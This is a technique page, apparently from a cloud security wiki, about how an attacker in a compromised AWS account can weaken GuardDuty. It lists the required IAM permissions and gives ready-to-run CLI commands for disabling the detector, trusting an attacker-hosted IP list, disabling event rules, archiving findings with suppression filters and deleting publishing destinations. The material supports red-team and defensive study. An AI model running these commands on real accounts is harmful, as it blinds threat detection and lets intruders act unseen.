---
author_name: Ben Leembruggen
title: Modify GuardDuty Configuration
description: Modify existing GuardDuty configurations in the target account to hinder alerting and remediation capabilities.
---

When an account has been successfully compromised, an attacker can modify threat detection services like GuardDuty to reduce the likelihood of their actions triggering an alert. Modifying, as opposed to outright deleting, key attributes of GuardDuty may be less likely to raise alerts, and result in a similar degradation of effectiveness.  The actions available to an attacker will largely depend on the compromised permissions available to the attacker, the GuardDuty architecture and the presence of higher level controls like [Service Control Policies](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps.html). 

Where GuardDuty uses a delegated admin or invite model, features like detector configurations and IP Trust lists are centrally managed, and so they can only be modified in the GuardDuty administrator account. Where this is not the case, these features can be modified in the account that GuardDuty is running in.

---
## Misconfiguring the Detector
An attacker could modify an existing GuardDuty detector in the account, to remove log sources or lessen its effectiveness.

<div class="grid cards" markdown>
-   :material-shield-lock:{ .lg .middle } __Required IAM Permissions__

    ---

    - [guardduty:ListDetectors](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/guardduty/list-detectors.html)
    - [guardduty:UpdateDetector](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/guardduty/update-detector.html)
</div>

Configuration changes may include a combination of:

- Disabling the detector altogether.  
- Removing Kubernetes and s3 as data sources, which removes all [S3 Protection](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html) and [Kubernetes alerts](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-kubernetes.html).  
- Increasing the event update frequency to 6 hours, as opposed to as low as 15 minutes.

Example CLI commands
```
# Disabling the detector
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --no-enable 

# Removing s3 as a log source
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --data-sources S3Logs={Enable=false}

# Increase finding update time to 6 hours
aws guardduty update-detector \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --finding-publishing-frequency SIX_HOURS
```

---
## Modifying Trusted IP Lists
An attacker could create or update GuardDuty's [Trusted IP list](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_upload-lists.html), including their own IP on the list.  Any IPs in a trusted IP list will not have any Cloudtrail or VPC flow log alerts raised against them. 

*DNS findings are exempt from the Trusted IP list.*

<div class="grid cards" markdown>
-   :material-shield-lock:{ .lg .middle } __Required IAM Permissions__

    ---

    - [guardduty:ListDetectors](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/guardduty/list-detectors.html)
    - [guardduty:ListIPSets](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/guardduty/list-ip-sets.html)
    - [guardduty:CreateIPSet](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/guardduty/create-ip-set.html)
    - [guardduty:UpdateIPSet](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/guardduty/update-ip-set.html)
    - [iam:PutRolePolicy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/put-role-policy.html)
</div>

*Depending on the level of stealth required, the file can be uploaded to an s3 bucket in the target account, or an account controlled by the attacker.*


Example CLI commands
```
aws guardduty update-ip-set \
    --detector-id 12abc34d567e8fa901bc2d34eexample \
    --ip-set-id 24adjigdk34290840348exampleiplist \
    --location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \
    --activate
```

---
## Modify Cloudwatch events rule
GuardDuty populates its findings to Cloudwatch Events on a 5 minute cadence.  Modifying the Event pattern or Targets for an event may reduce GuardDuty's ability to alert and trigger auto-remediation of findings, especially where the remediation is triggered in a member account as GuardDuty administrator protections do not extend to the Cloudwatch events in the member account. 

<div class="grid cards" markdown>
-   :material-shield-lock:{ .lg .middle } __Required IAM Permissions__

    ---

    - [events:ListRules](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/events/list-rules.html)
    - [events:ListTargetsByRule](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/events/list-targets-by-rule.html)
    - [events:PutRule](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/events/put-rule.html)
    - [events:RemoveTargets](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/events/remove-targets.html)
</div>

!!! Note  
    In a delegated or invitational admin GuardDuty architecture, cloudwatch events will still be created in the admin account.

Example CLI commands
```
# Disable GuardDuty Cloudwatch Event
aws events put-rule --name guardduty-event \
--event-pattern "{\"source\":[\"aws.guardduty\"]}" \
--state DISABLED

# Modify Event Pattern
aws events put-rule --name guardduty-event \
--event-pattern '{"source": ["aws.somethingthatdoesntexist"]}'

# Remove Event Targets
aws events remove-targets --name guardduty-event \
--ids "GuardDutyTarget"
```

---
## Supression Rules
Newly create GuardDuty findings can be automatically archived via [Suppression Rules](https://docs.aws.amazon.com/guardduty/latest/ug/findings_suppression-rule.html). An adversary could use [filters](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_filter-findings.html) to automatically archive findings they are likely to generate. 

<div class="grid cards" markdown>
-   :material-shield-lock:{ .lg .middle } __Required IAM Permissions__

    ---

    - [guardduty:CreateFilter](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/guardduty/create-filter.html)
</div>

Example CLI commands

```
aws  guardduty create-filter --action ARCHIVE --detector-id 12abc34d567e8fa901bc2d34e56789f0 --name yourfiltername --finding-criteria file://criteria.json
```

Filters can be created using the [CreateFilter API](https://docs.aws.amazon.com/guardduty/latest/APIReference/API_CreateFilter.html).

---
## Delete Publishing Destination
An adversary could disable alerting simply by [deleting the destination](https://docs.aws.amazon.com/cli/latest/reference/guardduty/delete-publishing-destination.html) of alerts.

<div class="grid cards" markdown>
-   :material-shield-lock:{ .lg .middle } __Required IAM Permissions__

    ---

    - [guardduty:DeletePublishingDestination](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/guardduty/delete-publishing-destination.html)
</div>

Example CLI commands

```
aws guardduty delete-publishing-destination --detector-id abc123 --destination-id def456
```